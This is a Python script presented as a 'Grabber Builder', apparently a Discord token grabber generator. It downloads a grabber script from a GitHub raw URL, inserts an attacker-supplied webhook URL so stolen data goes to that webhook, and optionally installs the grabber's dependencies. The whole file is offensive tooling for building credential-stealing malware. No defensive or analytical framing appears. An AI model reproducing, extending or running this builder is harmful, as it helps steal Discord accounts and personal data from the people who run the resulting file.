# Made by https://github.com/Paloox
# You have a question? add me on discord: p4u1_

import requests
import os
import pystyle
import colorama
from colorama import Fore
import win32gui
hwnd = win32gui.GetForegroundWindow()
win32gui.MoveWindow(hwnd, 100, 0, 1220, 850, True)

os.system("title Grabber Builder - by p4u1_")

os.system("cls")

def source_get_write(filename):
    url = 'https://raw.githubusercontent.com/Paloox/discordGrabberFile/main/grabber.py'
    response = requests.get(url)
    
    if response.status_code == 200:
        file_content = response.text
        with open(f'{filename}.py', 'w', encoding='utf-8') as file:
            file.write(file_content)

        


def set_webhook_url(file_path, webhook_url):
    search_text = "WEBHOOK_URL"
    replace_text = webhook_url

    with open(f'{file_path}.py', 'r') as file:
        data = file.read()
        data = data.replace(search_text, replace_text)

    with open(f'{file_path}.py', 'w') as file:
        file.write(data)
    print(f"{Fore.LIGHTGREEN_EX}File '{file_path}.py' created successfully!{Fore.RESET}")
def download_packets():
    os.system("python -m pip install pycryptodome pywin32 requests Pillow opencv-python imutils httpx")


def main():

    print(fr"{Fore.LIGHTMAGENTA_EX} _____                                                                                                              _____ {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX}( ___ )------------------------------------------------------------------------------------------------------------( ___ ){Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | G |                                                                                                              | G | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | R |  ██▓███      ██▀███      ██▓          ▄▄▄▄       █    ██     ██▓    ██▓       ▓█████▄    ▓█████     ██▀███   | R | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | A | ▓██░  ██▒   ▓██ ▒ ██▒   ▓██▒         ▓█████▄     ██  ▓██▒   ▓██▒   ▓██▒       ▒██▀ ██▌   ▓█   ▀    ▓██ ▒ ██▒ | A | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | B | ▓██░ ██▓▒   ▓██ ░▄█ ▒   ▒██▒         ▒██▒ ▄██   ▓██  ▒██░   ▒██▒   ▒██░       ░██   █▌   ▒███      ▓██ ░▄█ ▒ | B | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | B | ▒██▄█▓▒ ▒   ▒██▀▀█▄     ░██░         ▒██░█▀     ▓▓█  ░██░   ░██░   ▒██░       ░▓█▄   ▌   ▒▓█  ▄    ▒██▀▀█▄   | B | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | E | ▒██▒ ░  ░   ░██▓ ▒██▒   ░██░         ░▓█  ▀█▓   ▒▒█████▓    ░██░   ░██████▒   ░▒████▓    ░▒████▒   ░██▓ ▒██▒ | E | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | R | ▒▓▒░ ░  ░   ░ ▒▓ ░▒▓░   ░▓           ░▒▓███▀▒   ░▒▓▒ ▒ ▒    ░▓     ░ ▒░▓  ░    ▒▒▓  ▒    ░░ ▒░ ░   ░ ▒▓ ░▒▓░ | R | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} |   | ░▒ ░          ░▒ ░ ▒░    ▒ ░         ▒░▒   ░    ░░▒░ ░ ░     ▒ ░   ░ ░ ▒  ░    ░ ▒  ▒     ░ ░  ░     ░▒ ░ ▒░ |   | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | B | ░░            ░░   ░     ▒ ░          ░    ░     ░░░ ░ ░     ▒ ░     ░ ░       ░ ░  ░       ░        ░░   ░  | B | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | U |                ░         ░            ░            ░         ░         ░  ░      ░          ░  ░      ░      | U | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | I |                                            ░                                   ░                             | I | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} |_L_|                                        made by https://github.com/Paloox                                     |_L_| {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX}(__D__)------------------------------------------------------------------------------------------------------------(__D__){Fore.RESET}")      
    print("") 
    webhook_url = input(f"{Fore.CYAN}[{Fore.MAGENTA}+{Fore.CYAN}] {Fore.LIGHTGREEN_EX}Webhook URL: " + Fore.RESET)
    filename = input(f"{Fore.CYAN}[{Fore.MAGENTA}+{Fore.CYAN}] {Fore.LIGHTGREEN_EX}Filename: " + Fore.RESET)
    download = input(f"{Fore.CYAN}[{Fore.MAGENTA}+{Fore.CYAN}] {Fore.LIGHTGREEN_EX}Download packets for the grabber? (y/n) " + Fore.RESET)
    source_get_write(filename)
    set_webhook_url(filename, webhook_url)

    if(download == "y"):
        download_packets()

main()